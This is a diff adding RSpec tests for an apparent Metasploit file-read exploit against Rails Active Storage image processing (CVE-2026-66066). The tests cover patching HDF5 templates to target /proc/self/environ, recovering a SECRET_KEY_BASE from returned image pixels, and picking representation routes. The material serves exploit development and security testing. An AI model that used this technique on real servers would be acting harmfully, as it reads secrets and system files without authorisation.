+++ spec/lib/msf/core/exploit/remote/http/rails_active_storage_vips/file_reader_spec.rb
@@ -1,0 +1,232 @@
+# frozen_string_literal: true
+
+require 'spec_helper'
+require_relative 'support'
+
+RSpec.describe Msf::Exploit::Remote::HTTP::RailsActiveStorageVips::FileReader do
+  include RailsActiveStorageVipsSpecSupport
+
+  subject(:host) { build_rails_active_storage_vips_host }
+
+  let(:flow_error) { Msf::Exploit::Remote::HTTP::RailsActiveStorageVips::FlowError }
+  let(:data_error) { Msf::Exploit::Remote::HTTP::RailsActiveStorageVips::DataError }
+  let(:read_budget_error) { Msf::Exploit::Remote::HTTP::RailsActiveStorageVips::ReadBudgetError }
+  let(:trigger_error) { Msf::Exploit::Remote::HTTP::RailsActiveStorageVips::TriggerError }
+  let(:read_layouts) { described_class::READ_LAYOUTS }
+  let(:read_layout) { read_layouts.find { |layout| layout[:dimension] == 20 } }
+
+  describe '#restore_ascii_pixels' do
+    let(:source) do
+      Array.new(read_layout.fetch(:capacity)) { |index| 32 + (index % 95) }.pack('C*')
+    end
+    let(:raw_read) do
+      {
+        width: read_layout.fetch(:dimension),
+        height: read_layout.fetch(:dimension),
+        pixels: striped_pixels(read_layout, source)
+      }
+    end
+    let(:sharpened_read) do
+      # Captured from image_processing 1.14.0 and libvips 8.14.1 applying
+      # ImageProcessing::Vips::Processor::SHARPEN_MASK to raw_read.
+      pixels = Base64.strict_decode64(
+        'ACgAQQBaAHMAjAAuAEcAYAB5AAAAKQBCAFsAdACNADAASQBiAHsAAAArAEQAXQB2AI8AMQBKAGMAfAAAACwARQBeAHcAkAAy' \
+        'AEsAZAB9AAAALQBGAF8AeACRADMATABlAH4AAAAuAEcAYAB5AJIANQBOAGcAgAAAADAASQBiAHsAlAA2AE8AaACBAAAAMQBK' \
+        'AGMAfACVADcAUABpAIIAAAAyAEsAZAB9AJYAOABRAGoAgwAAADMATABlAH4AlwA6AFMAbACFAAAANQBOAGcAgACZADsAVABt' \
+        'AIYAAAA2AE8AaACBAJoAPABVAG4AhwAAADcAUABpAIIAmwA9AFYAbwCIAAAAOABRAGoAgwCcAD8AWABxAIoAAAA6AFMAbACF' \
+        'AKEAQABZAHIAiwAAADsAVABtAIYAJABBAFoAcwCMAAAAPABVAG4AhwApAEIAWwB0AI0AAAA9AFYAbwCIACsARABdAHYAjwAA' \
+        'AD8AWABxAIoALABFAF4AdwCQAAAAQABZAHIAiwAtAEYAXwB4AJEAAA=='
+      )
+      {
+        width: read_layout.fetch(:dimension),
+        height: read_layout.fetch(:dimension),
+        pixels: pixels
+      }
+    end
+
+    it 'restores raw striped bytes in source-file order' do
+      expect(host.send(:restore_ascii_pixels, raw_read, read_layout, :raw)).to eq(source)
+    end
+
+    it 'inverts the Vips sharpen convolution and restores exact bytes' do
+      expect(host.send(:restore_ascii_pixels, sharpened_read, read_layout, :sharpened)).to eq(source)
+    end
+
+    it 'rejects unexpected image geometry and truncated pixel data' do
+      wrong_geometry = raw_read.merge(width: read_layout.fetch(:dimension) - 1)
+      truncated = raw_read.merge(pixels: raw_read.fetch(:pixels).byteslice(0...-1))
+
+      expect { host.send(:restore_ascii_pixels, wrong_geometry, read_layout, :raw) }.to raise_error(trigger_error)
+      expect { host.send(:restore_ascii_pixels, truncated, read_layout, :raw) }.to raise_error(trigger_error)
+    end
+
+    it 'partially recovers a NUL-delimited ASCII secret after saturated bytes' do
+      prefix = "JUNK=\xff\xfe\xfd\x00SECRET_KEY_BASE=partial-safe-secret\x00".b
+      source = prefix.ljust(read_layout.fetch(:capacity), "\x00")
+      pixels = striped_pixels(read_layout, source)
+      dimension = read_layout.fetch(:dimension)
+
+      (1...(dimension - 1)).step(2) do |column|
+        observed = dimension.times.map { |row| pixels.getbyte((row * dimension) + column) }
+        sharpened = host.send(:sharpened_column, observed)
+        sharpened.each_with_index { |value, row| pixels.setbyte((row * dimension) + column, value) }
+      end
+
+      read = { width: dimension, height: dimension, pixels: pixels }
+      recovered = host.send(:restore_ascii_pixels_partial, read, read_layout)
+
+      expect(recovered).to include("SECRET_KEY_BASE=partial-safe-secret\x00".b)
+      expect(recovered).not_to include("JUNK=\xff".b)
+    end
+  end
+
+  describe '#read_text_file' do
+    it 'does not return data beyond max_bytes when the final read exceeds the boundary' do
+      capacity = read_layout.fetch(:capacity)
+      context = { layout: read_layout, mode: :raw }
+      first_read = { offset: 0 }
+      second_read = { offset: capacity }
+      observed_sizes = []
+
+      expect(host).to receive(:file_read_once).ordered.with(read_layout, '/proc/version', 0, 'read.h5').and_return(first_read)
+      expect(host).to receive(:restore_ascii_pixels).ordered.with(first_read, read_layout, :raw).and_return('A'.b * capacity)
+      expect(host).to receive(:file_read_once).ordered.with(read_layout, '/proc/version', capacity, 'read.h5').and_return(second_read)
+      expect(host).to receive(:restore_ascii_pixels).ordered.with(second_read, read_layout, :raw).and_return('B'.b * capacity)
+
+      recovered = host.send(
+        :read_text_file,
+        context,
+        '/proc/version',
+        max_bytes: capacity + 1,
+        filename: 'read.h5',
+        stop_when: lambda { |bytes|
+          observed_sizes << bytes.bytesize
+          false
+        }
+      )
+
+      expect(recovered).to eq(('A'.b * capacity) + 'B'.b)
+      expect(recovered.bytesize).to eq(capacity + 1)
+      expect(observed_sizes).to eq([capacity, capacity + 1])
+    end
+  end
+
+  describe '#request_variation_key_representation' do
+    let(:png_signature) { Msf::Exploit::Remote::HTTP::RailsActiveStorageVips::PngDecoder::PNG_SIGNATURE }
+
+    before do
+      host.datastore['VARIATION_KEY'] = 'variation'
+    end
+
+    it 'falls back to and retains the Rails 6.0 legacy route for crafted reads' do
+      allow(host).to receive(:request_representation)
+        .with('/rails/active_storage/representations/redirect/blob/variation/read.png')
+        .and_return(http_response(404))
+      allow(host).to receive(:request_representation)
+        .with('/rails/active_storage/representations/blob/variation/read.png')
+        .and_return(http_response(200, body: png_signature))
+
+      first_path, first_response = host.send(:request_variation_key_representation, 'blob', 'read.png')
+
+      expect(first_path).to eq('/rails/active_storage/representations/blob/variation/read.png')
+      expect(first_response.code).to eq(200)
+      expect(host.instance_variable_get(:@variation_key_route)).to eq(:legacy)
+
+      expect(host).to receive(:request_representation)
+        .with('/rails/active_storage/representations/blob/variation/next.png')
+        .and_return(http_response(200, body: png_signature))
+      second_path, = host.send(:request_variation_key_representation, 'blob', 'next.png')
+
+      expect(second_path).to eq('/rails/active_storage/representations/blob/variation/next.png')
+    end
+
+    it 'does not consult the application representation workflow when a key is supplied' do
+      expect(host).not_to receive(:base_representation_path)
+      allow(host).to receive(:request_variation_key_representation).with('blob', 'read.png').and_return(['/path', http_response(200)])
+
+      expect(host.send(:request_crafted_representation, 'blob', 'read.png').first).to eq('/path')
+    end
+  end
+
+  describe 'the crafted read request budget' do
+    it 'allows the configured number of reads, rejects the next one, and can be reset for a new phase' do
+      host.datastore['MaxReadRequests'] = 2
+      host.send(:reset_read_budget!)
+
+      expect { host.send(:reserve_read_request!) }.not_to raise_error
+      expect { host.send(:reserve_read_request!) }.not_to raise_error
+      expect { host.send(:reserve_read_request!) }.to raise_error(read_budget_error, /MaxReadRequests/)
+
+      host.send(:reset_read_budget!)
+      expect { host.send(:reserve_read_request!) }.not_to raise_error
+    end
+  end
+
+  describe '#patch_hdf5_template' do
+    let(:external_path) { '/proc/self/environ' }
+    let(:external_offset) { 4096 }
+    let(:placeholder) { described_class::EXTERNAL_PATH_PLACEHOLDER }
+    let(:marker_base) { described_class::EXTERNAL_OFFSET_MARKER }
+    let(:artifact_path) do
+      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2026-66066', read_layout.fetch(:artifact))
+    end
+
+    it 'matches every committed artifact to its read layout' do
+      read_layouts.each do |layout|
+        path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2026-66066', layout.fetch(:artifact))
+        expect(::File.file?(path)).to be(true)
+
+        data = ::File.binread(path)
+        dimension = layout.fetch(:dimension)
+        data_columns = layout.fetch(:data_columns)
+        marker_counts = data_columns.times.map do |index|
+          record = [marker_base + index, dimension].pack('Q<2')
+          data.scan(record).length
+        end
+
+        expect(layout.fetch(:capacity)).to eq(dimension * data_columns)
+        expect(data.scan(placeholder).length).to eq(data_columns)
+        expect(marker_counts).to all(eq(1))
+      end
+    end
+
+    it 'patches each external path and marker using the layout stride' do
+      expect(::File.file?(artifact_path)).to be(true)
+
+      original = ::File.binread(artifact_path)
+      patched = host.send(:patch_hdf5_template, read_layout, external_path, external_offset)
+      replacement = external_path.b.ljust(placeholder.bytesize, "\x00")
+
+      expect(patched.bytesize).to eq(original.bytesize)
+      expect(original.scan(placeholder).length).to eq(read_layout.fetch(:data_columns))
+      expect(patched.scan(replacement).length).to eq(read_layout.fetch(:data_columns))
+
+      read_layout.fetch(:data_columns).times do |index|
+        marker = [marker_base + index].pack('Q<')
+        expect(original.scan(marker).length).to eq(1)
+
+        marker_position = original.index(marker)
+        expect(marker_position).not_to be_nil
+        expect(patched.byteslice(marker_position, 8).unpack1('Q<')).to eq(external_offset + (index * read_layout.fetch(:dimension)))
+        expect(patched.byteslice(marker_position + 8, 8).unpack1('Q<')).to eq(read_layout.fetch(:dimension))
+      end
+
+      expect(::File.binread(artifact_path)).to eq(original)
+    end
+
+    it 'rejects an artifact that does not match its layout' do
+      smaller_layout = read_layouts.find { |layout| layout[:dimension] == 16 }
+      invalid_layout = read_layout.merge(artifact: smaller_layout.fetch(:artifact))
+
+      expect { host.send(:patch_hdf5_template, invalid_layout, external_path, external_offset) }.to raise_error(data_error)
+    end
+
+    it 'rejects invalid external paths and offsets' do
+      oversized_path = 'A' * (placeholder.bytesize + 1)
+
+      expect { host.send(:patch_hdf5_template, read_layout, "/bad\x00path", external_offset) }.to raise_error(flow_error, /NUL/)
+      expect { host.send(:patch_hdf5_template, read_layout, oversized_path, external_offset) }.to raise_error(flow_error)
+      expect { host.send(:patch_hdf5_template, read_layout, external_path, -1) }.to raise_error(flow_error)
+    end
+  end
+end
